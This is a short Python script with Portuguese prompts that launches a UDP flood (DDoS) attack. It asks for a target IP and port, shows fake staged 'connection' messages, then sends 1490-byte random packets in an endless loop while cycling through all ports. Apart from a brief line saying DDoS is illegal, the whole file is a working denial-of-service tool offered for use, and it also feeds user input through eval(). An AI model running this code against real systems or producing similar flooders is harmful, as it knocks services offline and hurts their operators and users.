print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("piromas-Ddos")
print()
print("Codado por : piromasbr")
print("Autor   : piromasbr")
print("Github   : github.com/piromasbr999")
print("que que pega viado ddos e ilegal entao nao faz merda com isso ok")
print()
ip = input("bota o ip aqui : ")
port = eval(input("Porta       : "))
os.system("clear")
os.system("piromas-Ddos")
print("piromasbr")
print ("\033[92m")
print("________________tentando entrar no server_____________________")
time.sleep(5)
print("________________estabilizando conexao_______________________")
time.sleep(5)
print("_________________conexao estabilizada________________________")
time.sleep(5)
print("_________________o atack ddos foi iniciado_________________")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1